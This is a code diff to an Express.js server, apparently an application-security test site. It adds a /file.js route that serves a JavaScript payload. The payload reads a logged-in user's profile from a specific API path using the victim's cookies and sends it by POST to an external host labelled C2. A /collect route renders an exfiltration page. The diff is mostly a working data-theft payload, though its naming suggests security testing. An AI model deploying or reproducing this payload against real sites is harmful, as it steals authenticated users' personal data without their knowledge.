@@ -17,6 +17,23 @@ app.get("/", (_req, res) => {
   res.redirect("/login");
 });
 
+app.get("/file.js", (_req, res) => {
+  res.type("application/javascript").send(`
+  var C2 = 'https://appsec-test-website.onrender.com/testpay';
+  var x = new XMLHttpRequest();
+  x.open('GET', '/sgw3/secureapp/N600/profileapi/v1/profile', false);
+  x.withCredentials = true;
+  x.send();
+  
+  var profile = x.responseText;
+  
+  var e = new XMLHttpRequest();
+  e.open('POST', C2, true);
+  e.setRequestHeader('Content-Type', 'application/json');
+  e.send(profile);
+  `);
+});
+
 app.get("/collect", (_req, res) => {
   res.send(renderExfilPage());
 });
